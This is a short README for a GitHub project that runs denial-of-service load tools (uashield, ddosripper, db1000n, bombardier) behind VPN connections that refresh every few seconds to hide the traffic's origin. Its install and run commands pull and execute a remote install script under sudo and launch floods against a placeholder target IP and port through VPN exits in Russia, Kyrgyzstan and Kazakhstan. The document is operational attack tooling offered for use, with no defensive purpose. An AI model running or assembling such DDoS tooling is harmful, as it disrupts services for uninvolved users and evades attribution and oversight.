# WTF
Script thay runs load under vpn and refreshes vpn every N seconds
Supports many VPN providers via https://github.com/qdm12/gluetun/wiki

# Install
```
cd / && sudo rm -rf runner && \
sudo git clone https://github.com/ctukraine22/runner && \
cd /runner && bash install.sh
```
# Run
To use cyberhost you need fork this repo and replace key and crt: https://github.com/qdm12/gluetun/wiki/Cyberghost
run uashield on cyberhost
```
cd /runner && . ./runner.sh && init 0 0 %user% %pass% cyberghost "Russian Federation" 97-1-ru.cg-dialup.net tcp && uashield
```
run uashield on expressvpn
```
cd /runner && . ./runner.sh && init 0 0 %user% %pass% expressvpn Kyrgyzstan kyrgyzstan-ca-version-2.expressnetw.com && uashield
```
run ddosripper for %ip% %port% on expressvpn
cd /runner && . ./runner.sh && init %ip% %port% %user% %pass% expressvpn Kazakhstan && ddosripper

# Supported tools
- db1000n
- checksites
- ddosripper
- uashield
- bombardier
- kali